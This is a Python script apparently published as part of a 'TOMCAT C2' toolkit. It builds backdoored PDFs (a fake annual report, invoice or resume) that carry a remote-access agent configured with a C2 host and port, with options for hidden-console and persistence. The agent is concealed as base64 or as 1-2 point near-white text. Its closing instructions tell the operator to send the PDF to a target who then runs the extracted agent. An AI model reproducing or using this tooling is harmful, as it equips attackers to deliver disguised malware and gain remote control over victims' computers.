#!/usr/bin/env python3

"""
TOMCAT C2 - Build Backdoored PDF
Creates PDF document with embedded TOMCAT agent that auto-connects to your C2 server
Author: TOM7
"""

import base64
import os
import subprocess
import sys

try:
    from reportlab.lib.colors import HexColor
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    from reportlab.lib.pagesizes import A4, letter
    from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
    from reportlab.lib.units import inch
    from reportlab.platypus import (
        PageBreak,
        Paragraph,
        Preformatted,
        SimpleDocTemplate,
        Spacer,
    )
except ImportError:
    print("[!] reportlab not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "reportlab"])
    from reportlab.lib.colors import HexColor
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    from reportlab.lib.pagesizes import A4, letter
    from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
    from reportlab.lib.units import inch
    from reportlab.platypus import (
        PageBreak,
        Paragraph,
        Preformatted,
        SimpleDocTemplate,
        Spacer,
    )

# Colors
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[0;34m"
CYAN = "\033[0;36m"
NC = "\033[0m"

AGENT_TEMPLATE = """tomcatv1a.py"""


def print_banner():
    banner = f"""
{RED}
    ___________________      _____  _________     ________________ _________  ________
    \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
      |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
      |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
      |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                       \\/         \\/        \\/         \\/                  \\/         \\/
{CYAN}              Build Backdoored PDF - Auto-Connect to C2 Server
{YELLOW}                     Author: TOM7 | Born For Exploitation{NC}
"""
    print(banner)


def configure_agent(server_host, server_port, hide_console=False, persistence=False):
    """Read and configure agent code with server details"""

    if not os.path.exists(AGENT_TEMPLATE):
        print(f"{RED}[-] Agent template not found: {AGENT_TEMPLATE}{NC}")
        print(f"{YELLOW}[!] Please make sure tomcatv1a.py is in the same directory{NC}")
        return None

    print(f"{BLUE}[*] Reading agent template: {AGENT_TEMPLATE}{NC}")

    try:
        with open(AGENT_TEMPLATE, "r", encoding="utf-8") as f:
            agent_code = f.read()

        # Configure server settings
        agent_code = agent_code.replace(
            'serverHost = "127.0.0.1"', f'serverHost = "{server_host}"'
        )
        agent_code = agent_code.replace(
            "serverPort = 4444", f"serverPort = {server_port}"
        )

        # Configure options
        agent_code = agent_code.replace(
            "HIDE_CONSOLE = False", f"HIDE_CONSOLE = {hide_console}"
        )
        agent_code = agent_code.replace(
            "ADD_PERSISTENCE = False", f"ADD_PERSISTENCE = {persistence}"
        )

        print(f"{GREEN}[+] Agent configured for {server_host}:{server_port}{NC}")
        print(f"{GREEN}[+] Hide Console: {hide_console}{NC}")
        print(f"{GREEN}[+] Persistence: {persistence}{NC}")

        return agent_code

    except Exception as e:
        print(f"{RED}[-] Error reading agent: {e}{NC}")
        return None


def create_business_report_pdf(
    agent_code, output_pdf, doc_title="Annual Report", stealth_level="high"
):
    """Create professional business report with embedded agent"""

    print(f"{BLUE}[*] Creating business report PDF: {output_pdf}{NC}")
    print(f"{BLUE}[*] Stealth Level: {stealth_level}{NC}")

    doc = SimpleDocTemplate(output_pdf, pagesize=letter)
    story = []
    styles = getSampleStyleSheet()

    # Custom styles
    title_style = ParagraphStyle(
        "CustomTitle",
        parent=styles["Heading1"],
        fontSize=28,
        textColor=HexColor("#1a237e"),
        spaceAfter=30,
        alignment=TA_CENTER,
    )

    heading_style = ParagraphStyle(
        "CustomHeading",
        parent=styles["Heading2"],
        fontSize=16,
        textColor=HexColor("#0d47a1"),
        spaceAfter=12,
    )

    # Title Page
    story.append(Spacer(1, 2 * inch))
    story.append(Paragraph(doc_title, title_style))
    story.append(Spacer(1, 0.5 * inch))
    story.append(Paragraph("Fiscal Year 2024", styles["Normal"]))
    story.append(Spacer(1, 0.3 * inch))
    story.append(Paragraph("Confidential - Internal Use Only", styles["Normal"]))
    story.append(PageBreak())

    # Executive Summary
    story.append(Paragraph("Executive Summary", heading_style))
    story.append(
        Paragraph(
            "This document presents a comprehensive analysis of our organizational performance, "
            "strategic initiatives, and operational metrics for the fiscal year 2024. "
            "The following sections provide detailed insights into key performance indicators, "
            "market analysis, and future projections.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Financial Overview
    story.append(Paragraph("Financial Overview", heading_style))
    story.append(
        Paragraph(
            "Revenue growth exceeded projections by 23% year-over-year, driven by strategic "
            "market expansion and operational efficiencies. Total revenue reached $47.3M with "
            "a gross margin improvement of 4.2 percentage points.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Operational Metrics
    story.append(Paragraph("Operational Metrics", heading_style))
    story.append(
        Paragraph(
            "Key operational indicators demonstrate sustained improvement across all business units. "
            "Customer satisfaction scores increased to 94%, employee retention improved by 12%, "
            "and operational efficiency gains of 18% were achieved through process optimization.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Market Analysis
    story.append(Paragraph("Market Analysis", heading_style))
    story.append(
        Paragraph(
            "Market positioning strengthened significantly with increased brand recognition "
            "and expanded market share. Competitive analysis indicates favorable positioning "
            "relative to industry peers, with particular strength in emerging market segments.",
            styles["Normal"],
        )
    )

    story.append(PageBreak())

    # Strategic Initiatives
    story.append(Paragraph("Strategic Initiatives", heading_style))
    story.append(
        Paragraph(
            "Implementation of strategic initiatives progressed according to plan, with key "
            "milestones achieved in digital transformation, process automation, and market "
            "expansion programs. Investment in technology infrastructure positions the "
            "organization for sustained competitive advantage.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Risk Assessment
    story.append(Paragraph("Risk Assessment", heading_style))
    story.append(
        Paragraph(
            "Comprehensive risk assessment protocols have been implemented across all operational "
            "areas. Enterprise risk management frameworks ensure proactive identification and "
            "mitigation of potential operational, financial, and strategic risks.",
            styles["Normal"],
        )
    )

    story.append(PageBreak())

    # Technical Appendix (where we hide the agent)
    story.append(Paragraph("Appendix A: Technical Specifications", heading_style))
    story.append(
        Paragraph(
            "Technical implementation details and system configuration parameters.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.2 * inch))

    # Embed agent based on stealth level
    if stealth_level == "low":
        # Visible code with markers
        story.append(Paragraph("System Configuration Code:", styles["Normal"]))
        story.append(Spacer(1, 0.1 * inch))
        code_style = ParagraphStyle(
            "Code", parent=styles["Code"], fontSize=6, fontName="Courier"
        )
        code_with_markers = f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END"
        story.append(Preformatted(code_with_markers, code_style))

    elif stealth_level == "medium":
        # Base64 encoded
        encoded = base64.b64encode(agent_code.encode()).decode()
        story.append(Paragraph("Encoded Configuration Data:", styles["Normal"]))
        story.append(Spacer(1, 0.1 * inch))
        code_style = ParagraphStyle(
            "Code", parent=styles["Code"], fontSize=5, fontName="Courier"
        )
        chunk_size = 80
        formatted = "\n".join(
            [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        )
        story.append(Preformatted(f"BASE64:{formatted}", code_style))

    else:  # high stealth
        # Nearly invisible
        hidden_style = ParagraphStyle(
            "Hidden",
            parent=styles["Code"],
            fontSize=2,
            textColor=HexColor("#F5F5F5"),
            fontName="Courier",
        )
        code_with_markers = f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END"
        story.append(Preformatted(code_with_markers, hidden_style))

    # Build PDF
    doc.build(story)
    print(f"{GREEN}[+] PDF created successfully: {output_pdf}{NC}")


def create_invoice_pdf(agent_code, output_pdf, invoice_number="INV-2024-1234"):
    """Create fake invoice with embedded agent"""

    print(f"{BLUE}[*] Creating invoice PDF: {output_pdf}{NC}")

    doc = SimpleDocTemplate(output_pdf, pagesize=letter)
    story = []
    styles = getSampleStyleSheet()

    # Title
    title_style = ParagraphStyle(
        "InvoiceTitle",
        parent=styles["Heading1"],
        fontSize=24,
        textColor=HexColor("#d32f2f"),
        alignment=TA_CENTER,
    )

    story.append(Paragraph("INVOICE", title_style))
    story.append(Spacer(1, 0.3 * inch))

    # Invoice details
    story.append(
        Paragraph(f"<b>Invoice Number:</b> {invoice_number}", styles["Normal"])
    )
    story.append(Paragraph("<b>Date:</b> December 14, 2024", styles["Normal"]))
    story.append(Paragraph("<b>Due Date:</b> January 14, 2025", styles["Normal"]))
    story.append(Spacer(1, 0.3 * inch))

    # From/To
    story.append(Paragraph("<b>From:</b>", styles["Heading3"]))
    story.append(
        Paragraph(
            "ABC Corporation<br/>123 Business St<br/>New York, NY 10001",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.2 * inch))

    story.append(Paragraph("<b>Bill To:</b>", styles["Heading3"]))
    story.append(
        Paragraph(
            "Your Company<br/>456 Corporate Ave<br/>Chicago, IL 60601", styles["Normal"]
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Items
    story.append(Paragraph("<b>Description of Services:</b>", styles["Heading3"]))
    story.append(Paragraph("Professional Services - Q4 2024", styles["Normal"]))
    story.append(Paragraph("Consulting and Implementation", styles["Normal"]))
    story.append(Spacer(1, 0.2 * inch))
    story.append(Paragraph("<b>Amount Due: $15,750.00</b>", styles["Heading2"]))
    story.append(Spacer(1, 0.3 * inch))

    # Payment instructions
    story.append(Paragraph("Payment Instructions:", styles["Heading3"]))
    story.append(
        Paragraph(
            "Please remit payment to the account details provided below.",
            styles["Normal"],
        )
    )

    story.append(PageBreak())

    # Hidden agent code
    story.append(Paragraph("Transaction Details (Encoded)", styles["Heading3"]))

    encoded = base64.b64encode(agent_code.encode()).decode()
    code_style = ParagraphStyle(
        "Code", parent=styles["Code"], fontSize=4, fontName="Courier"
    )
    chunk_size = 80
    formatted = "\n".join(
        [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    )
    story.append(Preformatted(f"BASE64:{formatted}", code_style))

    doc.build(story)
    print(f"{GREEN}[+] Invoice PDF created: {output_pdf}{NC}")


def create_resume_pdf(agent_code, output_pdf, name="John Smith"):
    """Create fake resume with embedded agent"""

    print(f"{BLUE}[*] Creating resume PDF: {output_pdf}{NC}")

    doc = SimpleDocTemplate(output_pdf, pagesize=letter)
    story = []
    styles = getSampleStyleSheet()

    # Name
    name_style = ParagraphStyle(
        "Name",
        parent=styles["Heading1"],
        fontSize=32,
        textColor=HexColor("#1565c0"),
        alignment=TA_CENTER,
    )

    story.append(Paragraph(name, name_style))
    story.append(Paragraph("Senior Software Engineer", styles["Normal"]))
    story.append(
        Paragraph(
            "email@example.com | (555) 123-4567 | LinkedIn.com/in/johnsmith",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.3 * inch))

    # Professional Summary
    story.append(Paragraph("PROFESSIONAL SUMMARY", styles["Heading2"]))
    story.append(
        Paragraph(
            "Results-driven software engineer with 8+ years of experience in full-stack development, "
            "cloud architecture, and team leadership. Proven track record of delivering scalable "
            "solutions and driving technical innovation.",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.2 * inch))

    # Experience
    story.append(Paragraph("PROFESSIONAL EXPERIENCE", styles["Heading2"]))
    story.append(
        Paragraph(
            "<b>Senior Software Engineer</b> - Tech Corp (2020-Present)",
            styles["Normal"],
        )
    )
    story.append(
        Paragraph(
            "• Led development of microservices architecture serving 5M+ users<br/>"
            "• Implemented CI/CD pipelines reducing deployment time by 70%<br/>"
            "• Mentored team of 5 junior developers",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.2 * inch))

    # Skills
    story.append(Paragraph("TECHNICAL SKILLS", styles["Heading2"]))
    story.append(
        Paragraph(
            "Python, JavaScript, Java, React, Node.js, AWS, Docker, Kubernetes, PostgreSQL, MongoDB",
            styles["Normal"],
        )
    )
    story.append(Spacer(1, 0.2 * inch))

    # Education
    story.append(Paragraph("EDUCATION", styles["Heading2"]))
    story.append(
        Paragraph(
            "Bachelor of Science in Computer Science - State University (2016)",
            styles["Normal"],
        )
    )

    story.append(PageBreak())

    # Hidden agent (very stealthy)
    hidden_style = ParagraphStyle(
        "Hidden",
        parent=styles["Code"],
        fontSize=1,
        textColor=HexColor("#FAFAFA"),
        fontName="Courier",
    )
    story.append(
        Preformatted(
            f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END", hidden_style
        )
    )

    doc.build(story)
    print(f"{GREEN}[+] Resume PDF created: {output_pdf}{NC}")


def main():
    print_banner()

    print(f"{CYAN}[*] TOMCAT C2 Backdoored PDF Builder{NC}\n")

    # Get server configuration
    print(f"{YELLOW}=== C2 Server Configuration ==={NC}")
    server_host = (
        input(f"{CYAN}[?] Enter C2 Server IP/Host [127.0.0.1]: {NC}").strip()
        or "127.0.0.1"
    )
    server_port = (
        input(f"{CYAN}[?] Enter C2 Server Port [4444]: {NC}").strip() or "4444"
    )

    print(f"\n{YELLOW}=== Agent Options ==={NC}")
    hide_console = (
        input(f"{CYAN}[?] Hide console window? (y/n) [n]: {NC}").strip().lower() == "y"
    )
    persistence = (
        input(f"{CYAN}[?] Enable persistence? (y/n) [n]: {NC}").strip().lower() == "y"
    )

    # Configure agent
    agent_code = configure_agent(
        server_host, int(server_port), hide_console, persistence
    )
    if not agent_code:
        sys.exit(1)

    print(f"\n{YELLOW}=== Document Type ==={NC}")
    print("1. Business Report (Professional)")
    print("2. Invoice (Financial)")
    print("3. Resume/CV (Personal)")
    print("4. All Types")

    choice = input(f"{CYAN}[?] Select document type [1]: {NC}").strip() or "1"

    print(f"\n{YELLOW}=== Stealth Level ==={NC}")
    print("low    - Visible code (easy to extract)")
    print("medium - Base64 encoded")
    print("high   - Nearly invisible (recommended)")

    stealth = input(f"{CYAN}[?] Select stealth level [high]: {NC}").strip() or "high"

    print(f"\n{BLUE}[*] Building backdoored PDF(s)...{NC}\n")

    if choice == "1":
        title = (
            input(f"{CYAN}[?] Document title [Annual Report]: {NC}").strip()
            or "Annual Report"
        )
        create_business_report_pdf(agent_code, "backdoor_report.pdf", title, stealth)
    elif choice == "2":
        invoice_num = (
            input(f"{CYAN}[?] Invoice number [INV-2024-1234]: {NC}").strip()
            or "INV-2024-1234"
        )
        create_invoice_pdf(agent_code, "backdoor_invoice.pdf", invoice_num)
    elif choice == "3":
        name = (
            input(f"{CYAN}[?] Name on resume [John Smith]: {NC}").strip()
            or "John Smith"
        )
        create_resume_pdf(agent_code, "backdoor_resume.pdf", name)
    elif choice == "4":
        create_business_report_pdf(
            agent_code, "backdoor_report.pdf", "Annual Report", stealth
        )
        create_invoice_pdf(agent_code, "backdoor_invoice.pdf")
        create_resume_pdf(agent_code, "backdoor_resume.pdf")
        print(f"\n{GREEN}[+] All document types created!{NC}")
    else:
        print(f"{RED}[-] Invalid choice{NC}")
        sys.exit(1)

    print(f"\n{GREEN}{'=' * 60}{NC}")
    print(f"{GREEN}[+] Backdoored PDF(s) created successfully!{NC}")
    print(f"{GREEN}{'=' * 60}{NC}")
    print(f"\n{CYAN}[*] Usage Instructions:{NC}")
    print(f"1. Start your C2 server: python tomcatv1s.py")
    print(f"2. Send the PDF to target")
    print(f"3. Target extracts and runs: python extract_pdf.py <pdf_file>")
    print(f"4. Agent connects to {server_host}:{server_port}")
    print(f"\n{YELLOW}[!] Agent Configuration:{NC}")
    print(f"    Server: {server_host}:{server_port}")
    print(f"    Hide Console: {hide_console}")
    print(f"    Persistence: {persistence}")
    print(f"    Stealth Level: {stealth}")


if __name__ == "__main__":
    main()
